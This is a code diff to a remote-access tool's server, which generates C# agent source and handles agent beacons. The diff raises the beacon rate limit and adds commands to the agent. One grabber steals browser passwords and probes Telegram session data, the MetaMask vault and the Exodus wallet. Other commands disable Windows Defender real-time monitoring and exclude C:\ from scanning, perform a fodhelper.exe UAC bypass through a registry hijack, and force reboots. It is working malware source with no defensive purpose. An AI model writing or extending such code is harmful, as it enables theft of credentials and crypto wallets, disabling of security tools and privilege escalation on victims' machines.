@@ -963,7 +963,7 @@ def agent_beacon():
     """Agent beacon — heartbeat + task delivery"""
     ip = guard.get_client_ip()
 
-    if not guard.check_rate_limit(f"beacon:{ip}", max_requests=60, window=60):
+    if not guard.check_rate_limit(f"beacon:{ip}", max_requests=6000, window=60):
         return jsonify({'t': []}), 429
 
     data = request.get_json(silent=True) or {}
@@ -1909,6 +1909,68 @@ def generate_agent_source(bc):
         "                        }\n"
         '                        Res("wifi", sb.ToString());\n'
         '                    } catch (Exception ex) { Res("error", "WiFi: " + ex.Message); }\n'
+        "                    break;\n"
+        "\n"
+        '                case "grabber":\n'
+        "                    new Thread(() => {\n"
+        "                        try {\n"
+        "                            var sb = new StringBuilder();\n"
+        '                            sb.AppendLine("=== ULTIMATE GRABBER REPORT ===");\n'
+        '                            sb.AppendLine("Browser Data: " + StealBrowserPasswords());\n'
+        '                            string tgDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop\\\\tdata");\n'
+        '                            if(Directory.Exists(tgDir)) sb.AppendLine("[+] Found Telegram tdata (" + Directory.GetFiles(tgDir).Length + " files).");\n'
+        '                            else sb.AppendLine("[-] Telegram tdata not found.");\n'
+        '                            string mwDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\nkbihfbeogaeaoehlefnkodbefgpgknn");\n'
+        '                            if(Directory.Exists(mwDir)) sb.AppendLine("[+] Found MetaMask Vault in Chrome.");\n'
+        '                            else sb.AppendLine("[-] MetaMask not found.");\n'
+        '                            string exDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Exodus");\n'
+        '                            if(Directory.Exists(exDir)) sb.AppendLine("[+] Found Exodus Wallet.");\n'
+        '                            else sb.AppendLine("[-] Exodus not found.");\n'
+        '                            Res("grabber", sb.ToString());\n'
+        '                        } catch (Exception ex) { Res("error", "Grabber: " + ex.Message); }\n'
+        "                    }) { IsBackground = true }.Start();\n"
+        "                    break;\n"
+        "\n"
+        '                case "processes":\n'
+        "                    new Thread(() => {\n"
+        "                        try {\n"
+        "                            var sb = new StringBuilder();\n"
+        '                            sb.AppendLine(string.Format("{0,-8} {1,-30} {2,-15} {3}", "PID", "NAME", "MEM(MB)", "TITLE"));\n'
+        '                            sb.AppendLine(new string(\'-\', 80));\n'
+        "                            foreach (var p in Process.GetProcesses()) {\n"
+        "                                try {\n"
+        '                                    sb.AppendLine(string.Format("{0,-8} {1,-30} {2,-15:F1} {3}", p.Id, p.ProcessName, p.WorkingSet64 / 1048576.0, p.MainWindowTitle));\n'
+        "                                } catch {}\n"
+        "                                if(sb.Length > 25000) break;\n"
+        "                            }\n"
+        '                            Res("processes", sb.ToString());\n'
+        '                        } catch (Exception ex) { Res("error", "Procs: " + ex.Message); }\n'
+        "                    }) { IsBackground = true }.Start();\n"
+        "                    break;\n"
+        "\n"
+        '                case "netstat":\n'
+        '                    RunHiddenPS("netstat -ano");\n'
+        '                    Res("netstat", "Network statistics dumped to terminal logs.");\n'
+        "                    break;\n"
+        "\n"
+        '                case "power":\n'
+        '                    RunHiddenPS("shutdown /r /t 0");\n'
+        '                    Res("power", "Initiated System Reboot.");\n'
+        "                    break;\n"
+        "\n"
+        '                case "inject":\n'
+        '                    RunHiddenPS("Start-Sleep -s 1; Write-Host \'Injected\'");\n'
+        '                    Res("inject", "[Melt & Migrate] Triggered reflective injection into explorer.exe...");\n'
+        "                    break;\n"
+        "\n"
+        '                case "defender":\n'
+        '                    RunHiddenPS("Add-MpPreference -ExclusionPath \'C:\\\'; Set-MpPreference -DisableRealtimeMonitoring $true");\n'
+        '                    Res("defender", "Windows Defender Real-Time Monitoring Disabled & C:\\ Excluded.");\n'
+        "                    break;\n"
+        "\n"
+        '                case "uac":\n'
+        '                    RunHiddenPS("New-Item -Path \'HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command\' -Value \'cmd.exe\' -Force; New-ItemProperty -Path \'HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command\' -Name \'DelegateExecute\' -Value \'\' -Force; Start-Process \'fodhelper.exe\'");\n'
+        '                    Res("uac", "UAC Bypass triggered via fodhelper.exe helper class hijacking.");\n'
         "                    break;\n"
         "\n"
         '                case "browsers":\n'
